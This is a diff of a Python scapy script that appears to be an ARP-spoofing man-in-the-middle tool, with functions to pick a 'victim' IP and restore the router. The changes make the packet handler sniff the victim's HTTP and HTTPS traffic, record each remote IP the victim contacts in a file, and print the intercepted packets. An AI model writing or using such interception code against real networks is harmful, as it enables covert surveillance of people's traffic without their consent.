@@ -5,7 +5,8 @@ import time
 import sys
 import threading
 
-victime_ip='0'
+victim_ip='0'
+ips=[]
 
 def select_victim():
     victim_ip=raw_input('Input victim IP')
@@ -34,19 +35,20 @@ def recover(victim_ip, router_ip):
 
 def pr(x):
     try:
-        global victime_ip
-        print victime_ip
-        if x['IP'].dst == '192.168.6.122' or x['IP'].src == '192.168.6.122':
-            del x['IP'].chksum
-            if x.haslayer(scapy.all.UDP):
-                del x['UDP'].chksum
-                del x['UDP'].len
-
+        global victim_ip
+        global ips
+        print victim_ip
+        with open('test.txt', 'at') as f:
             if x.haslayer(scapy.all.TCP):
-                del x['TCP'].chksum
-                del x['TCP'].len
+                if x['TCP'].sport == 80 or x['TCP'].dport == 80 or x['TCP'].sport == 443 or x['TCP'].dport == 443:
+                    if x['IP'].src == victim_ip and not(str(x['IP'].dst) in ips):
+                        f.write(str(x['IP'].dst)+' ')
+                        ips.append(str(x['IP'].dst))
+                    elif x['IP'].dst == victim_ip and not (str(x['IP'].src) in ips):
+                        f.write(str(x['IP'].src)+' ')
+                        ips.append(str(x['IP'].src))
+                    x.show()
 
-            x.show()
             #if x['IP'].dst == '192.168.0.2':
             #    x['Ethernet'].dst=getMac('192.168.0.2')
             #    x.show();
@@ -92,5 +94,6 @@ def main():
 
 
 if __name__ == '__main__':
+    with open('test.txt', 'rt') as f:
+        ips=f.read().split(' ')
     main()
-
